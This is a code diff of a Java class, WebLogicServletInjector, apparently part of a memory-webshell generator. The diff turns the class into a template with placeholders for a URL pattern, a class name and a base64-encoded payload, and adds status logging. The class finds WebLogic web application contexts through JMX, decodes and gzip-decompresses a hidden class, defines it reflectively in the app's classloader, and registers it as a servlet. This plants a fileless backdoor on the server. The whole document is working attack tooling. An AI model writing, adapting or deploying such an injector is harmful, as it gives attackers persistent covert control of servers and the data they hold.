@@ -5,6 +5,7 @@ import javax.servlet.Servlet;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.management.ManagementFactory;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
@@ -15,46 +16,75 @@ import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
- * @author ReaJason
  */
 public class WebLogicServletInjector {
 
-    private static String urlPattern;
-    private static String shellClassName;
-    private static String shellClass;
-    private static boolean ok;
+    private static String msg = "";
+    private static boolean ok = false;
+
+    public String getUrlPattern() {
+        return "{{urlPattern}}";
+    }
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() throws IOException {
+        return "{{base64Str}}";
+    }
 
     public WebLogicServletInjector() {
         if (ok) {
             return;
         }
-        Set<Object> contexts;
+        Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
-            contexts = null;
+            msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts != null && !contexts.isEmpty()) {
+        if (contexts == null || contexts.isEmpty()) {
+            msg += "context not found";
+        } else {
             for (Object context : contexts) {
                 try {
+                    msg += ("context: [" + getContextRoot(context) + "] ");
                     Object shell = getShell(context);
                     inject(context, shell);
-                } catch (Throwable ignored) {
+                    msg += "[" + getUrlPattern() + "] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
                 }
             }
         }
         ok = true;
-        shellClass = null;
-        shellClassName = null;
-        urlPattern = null;
+        System.out.println(msg);
     }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(context, "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
+    }
+
 
     /**
      * weblogic.servlet.internal.WebAppServletContext
      * /opt/oracle/wls1036/server/lib/weblogic.jar
      * /u01/oracle/wlserver/modules/com.oracle.weblogic.servlet.jar
      */
-    @SuppressWarnings("unchecked")
     public static Set<Object> getContext() throws Exception {
         Set<Object> webappContexts = new HashSet<Object>();
         MBeanServer platformMBeanServer = ManagementFactory.getPlatformMBeanServer();
@@ -99,9 +129,9 @@ public class WebLogicServletInjector {
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
         try {
-            return classLoader.loadClass(shellClassName).newInstance();
+            return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
@@ -124,20 +154,25 @@ public class WebLogicServletInjector {
         try {
             servletStubImplConstructor = servletStubImplClass.getDeclaredConstructor(String.class, Servlet.class, webAppServletContextClass);
             servletStubImplConstructor.setAccessible(true);
-            servletStub = servletStubImplConstructor.newInstance(shellClassName, servlet, context);
+            servletStub = servletStubImplConstructor.newInstance(getClassName(), servlet, context);
         } catch (NoSuchMethodException e) {
             // 10.3.6
             servletStubImplConstructor = servletStubImplClass.getDeclaredConstructor(String.class, String.class, webAppServletContextClass, Map.class);
             servletStubImplConstructor.setAccessible(true);
-            servletStub = servletStubImplConstructor.newInstance(shellClassName, shellClassName, context, null);
+            servletStub = servletStubImplConstructor.newInstance(getClassName(), getClassName(), context, null);
         }
         Constructor<?> urlMatchHelperConstructor = contextClassLoader.loadClass("weblogic.servlet.internal.URLMatchHelper").getDeclaredConstructor(String.class, servletStubImplClass);
         urlMatchHelperConstructor.setAccessible(true);
-        Object urlMatchHelper = urlMatchHelperConstructor.newInstance(urlPattern, servletStub);
-        Object mapping = invokeMethod(servletMapping, "get", new Class[]{String.class}, new Object[]{urlPattern});
+        Object urlMatchHelper = urlMatchHelperConstructor.newInstance(getUrlPattern(), servletStub);
+        Object mapping = invokeMethod(servletMapping, "get", new Class[]{String.class}, new Object[]{getUrlPattern()});
         if (mapping == null) {
-            invokeMethod(servletMapping, "put", new Class[]{String.class, Object.class}, new Object[]{urlPattern, urlMatchHelper});
+            invokeMethod(servletMapping, "put", new Class[]{String.class, Object.class}, new Object[]{getUrlPattern(), urlMatchHelper});
         }
+    }
+
+    @Override
+    public String toString() {
+        return msg;
     }
 
     @SuppressWarnings("all")
@@ -193,5 +228,20 @@ public class WebLogicServletInjector {
             }
         }
         throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
     }
 }
